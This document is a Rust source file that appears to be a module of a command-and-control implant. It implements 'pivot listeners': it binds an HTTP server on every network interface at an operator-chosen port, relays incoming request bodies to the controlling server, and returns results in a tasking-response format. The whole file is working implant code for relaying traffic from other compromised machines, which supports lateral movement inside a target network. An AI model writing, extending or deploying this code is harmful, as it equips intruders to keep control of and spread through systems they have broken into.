use std::{
    collections::HashMap,
    net::{TcpListener, TcpStream},
    sync::{Arc, Mutex, atomic::{AtomicBool, Ordering}},
    thread::{self, JoinHandle},
    io::{Read, Write}
};
use lazy_static::lazy_static;
use serde_json::Value;
use crate::transport::send_request_with_response_raw;

lazy_static! {
    static ref LISTENERS: Mutex<HashMap<u16, (JoinHandle<()>, Arc<AtomicBool>)>> = Mutex::new(HashMap::new());
}



pub fn startPivotListener(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let raw_params = task.get("parameters")
        .ok_or("missing parameters")?
        .as_str()
        .ok_or("parameters is not a string")?;
    let params: Value = serde_json::from_str(raw_params)?;
    let port = params.get("arg1")
        .and_then(Value::as_str)
        .ok_or("missing arg1")?
        .parse::<u16>()?;

    let mut map = LISTENERS.lock().unwrap();
    if map.contains_key(&port) {
        return Err("listener already running on this port".into());
    }

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    let handle = thread::spawn(move || {
        let server = tiny_http::Server::http(("0.0.0.0", port)).expect("bind failed");

        for mut request in server.incoming_requests() {
            if !r.load(Ordering::SeqCst) {
                break;
            }

            thread::spawn(move || {
                let mut body = String::new();
                if request.as_reader().read_to_string(&mut body).is_ok() {
                    match crate::transport::send_request_with_response_raw(&body) {
                        Ok(res) => {
                            let _ = request.respond(
                                tiny_http::Response::from_string(res.to_string()).with_status_code(200)
                            );
                        }
                        Err(_) => {
                            let _ = request.respond(
                                tiny_http::Response::from_string("proxy error").with_status_code(500)
                            );
                        }
                    }
                } else {
                    let _ = request.respond(
                        tiny_http::Response::from_string("bad request").with_status_code(400)
                    );
                }
            });
        }
    });

    map.insert(port, (handle, running));
    let response_json = serde_json::json!({
        "action": "post_response",
        "responses": [
            {
                "task_id": task.get("id").unwrap().as_str().unwrap(),
                "user_output": format!("Pivot listener started on port {}", port),
                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
                "status": "success",
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    crate::transport::send_request(&response_value)?;
    Ok(())
}
pub fn stopPivotListener(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let raw_params = task.get("parameters")
        .ok_or("missing parameters")?
        .as_str()
        .ok_or("parameters is not a string")?;
    let params: Value = serde_json::from_str(raw_params)?;
    let port = params.get("arg1")
        .and_then(Value::as_str)
        .ok_or("missing arg1")?
        .parse::<u16>()?;

    let mut map = LISTENERS.lock().unwrap();
    if let Some((handle, flag)) = map.remove(&port) {
        flag.store(false, Ordering::SeqCst);
        // dummy request to unblock tiny_http (it blocks on next incoming request)
        let _ = std::net::TcpStream::connect(("127.0.0.1", port));
        let _ = handle.join();
    } else {
        return Err("no listener on specified port".into());
    }

    let response_json = serde_json::json!({
        "action": "post_response",
        "responses": [
            {
                "task_id": task.get("id").unwrap().as_str().unwrap(),
                "user_output": format!("Pivot listener stopped on port {}", port),
                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
                "status": "success",
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    crate::transport::send_request(&response_value)?;
    Ok(())
}

pub fn listPivotListeners(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let ports: Vec<u16> = {
        let map = LISTENERS.lock().unwrap();
        map.keys().cloned().collect()
    };

    let port_list = if ports.is_empty() {
        "No active pivot listeners.".to_string()
    } else {
        format!("Active pivot listener ports: {}", ports.iter().map(u16::to_string).collect::<Vec<_>>().join(", "))
    };

    let response_json = serde_json::json!({
        "action": "post_response",
        "responses": [
            {
                "task_id": task.get("id").unwrap().as_str().unwrap(),
                "user_output": port_list,
                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
                "status": "success",
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    crate::transport::send_request(&response_value)?;

    Ok(())
}
